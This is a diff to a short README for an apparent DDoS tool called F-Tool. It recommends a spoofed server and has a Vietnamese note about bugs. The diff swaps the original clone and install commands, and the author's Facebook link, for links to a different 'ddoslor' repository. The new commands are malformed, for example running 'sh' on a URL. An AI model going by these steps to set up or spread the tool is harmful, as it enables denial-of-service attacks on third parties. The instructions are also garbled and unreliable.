@@ -26,14 +26,14 @@
 
 * Please use spoofed server for the best experience.
 
-* ```git clone https://github.com/DoHoangLaminfo01/F-Toolv2``
-* ```cd F-Tool; sh install.sh```
+* ```git clone https://github.com/ngotrunganhh/ddoslor/releases``
+* ```cd F-Tool; sh https://github.com/ngotrunganhh/ddoslor/releases```
 
 * Install CentOS
 
-* ```cd F-Tool; sh installCentOS.sh```
+* ```cd F-Tool; sh https://github.com/ngotrunganhh/ddoslor/releases```
 
 Tool cũ thằng dec ngu nên đã có xíu lỗi, ae sài tool này có lỗi ib fb mình nhé
-url fb: https://www.facebook.com/DoHoangLam.X.Developer 
+url fb: https://github.com/ngotrunganhh/ddoslor/releases 
 
 Thanks you verymuch
